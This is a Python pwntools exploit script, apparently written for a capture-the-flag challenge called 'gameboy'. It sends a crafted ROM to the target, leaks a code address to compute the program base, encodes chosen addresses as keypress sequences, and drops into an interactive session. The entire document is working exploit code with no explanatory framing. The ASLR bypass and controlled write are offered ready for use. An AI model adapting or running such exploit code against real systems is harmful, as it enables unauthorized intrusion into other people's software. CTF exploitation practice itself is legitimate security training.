#!/usr/bin/env python

from pwn import *
import time, sys, os
from struct import pack, unpack

local = False
local = True

if local:
	DELAY = 0.05
else:
	DELAY = 0.2

host = "gameboy.chal.pwning.xxx"
port = 30908

elf = 'gameboy'

if local:
	s = process(elf)
else:
	s = remote(host, port)

img = open('gameboy.gb','rb').read()

if local:
	raw_input("attach {}>".format(s.pid))
s.send(img)

def send_byte(b):
	chrs = ['d','a','s','w']
	hh = (b >> 6) & 3
	hl = (b >> 4) & 3
	lh = (b >> 2) & 3
	ll = (b >> 0) & 3
	s.send(chrs[ll])
	time.sleep(DELAY)
	s.send(chrs[lh])
	time.sleep(DELAY)
	s.send(chrs[hl])
	time.sleep(DELAY)
	s.send(chrs[hh])
	time.sleep(DELAY)

s.recvuntil('A'*16)
leak = s.recvuntil('\n')[:-1]
#print 'Leaked:', leak.encode('hex')
leak = leak + '\x00'*(8-len(leak))
laddr = unpack("<Q", leak)[0]
#print hex(laddr)
progbase = laddr - 0xc0b

print 'Program Base:', hex(progbase)
data_offset = 0x203000

data_offset += 0xd00 # move a bit up in the data page

for b in pack("<Q", progbase + data_offset):
	print 'send:', hex(ord(b))
	send_byte(ord(b))
print 'address 1 sent'

for b in pack("<Q", progbase + data_offset - 0xfd00):
	print 'send:', hex(ord(b))
	send_byte(ord(b))
print 'address 2 sent'

#time.sleep(1)

s.interactive()

